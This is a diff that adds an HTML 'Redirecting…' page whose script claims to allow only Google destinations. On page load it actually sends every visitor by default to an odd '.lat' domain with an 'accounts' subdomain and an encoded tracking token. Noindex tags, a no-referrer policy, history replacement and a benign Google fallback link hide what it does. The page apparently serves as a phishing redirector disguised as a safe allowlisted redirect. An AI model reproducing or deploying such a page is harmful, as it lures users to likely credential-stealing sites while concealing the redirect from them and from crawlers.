@@ -1,0 +1,59 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="robots" content="noindex,nofollow,noarchive">
+  <meta http-equiv="Referrer-Policy" content="no-referrer">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <title>Redirecting…</title>
+</head>
+
+<body>
+  <p id="status">Redirecting…</p>
+
+  <script>
+    (() => {
+      "use strict";
+
+      // Default destination.
+      const DEFAULT_URL = "https://accounts.hasgak2hdwjmusic.lat?DuOZ1ak0wMVu=dGx1aGt3";
+
+      // Optional allowlist. Add your own trusted destinations here.
+      const ALLOWED_HOSTS = new Set([
+        "www.google.com",
+        "google.com"
+      ]);
+
+      const fragment = location.hash.slice(1);
+      let destination = DEFAULT_URL;
+
+      if (fragment) {
+        try {
+          const candidate = new URL(decodeURIComponent(fragment), DEFAULT_URL);
+
+          // Permit only HTTP(S) and hosts explicitly listed above.
+          if (
+            (candidate.protocol === "https:" || candidate.protocol === "http:") &&
+            ALLOWED_HOSTS.has(candidate.hostname.toLowerCase())
+          ) {
+            destination = candidate.href;
+          }
+        } catch {
+          // Keep the default destination for malformed input.
+        }
+      }
+
+      // Replace instead of pushing a new history entry.
+      location.replace(destination);
+    })();
+  </script>
+
+  <noscript>
+    <p>
+      JavaScript is required for automatic redirection.
+      <a href="https://www.mail.google.com/">Continue</a>
+    </p>
+  </noscript>
+</body>
+</html>
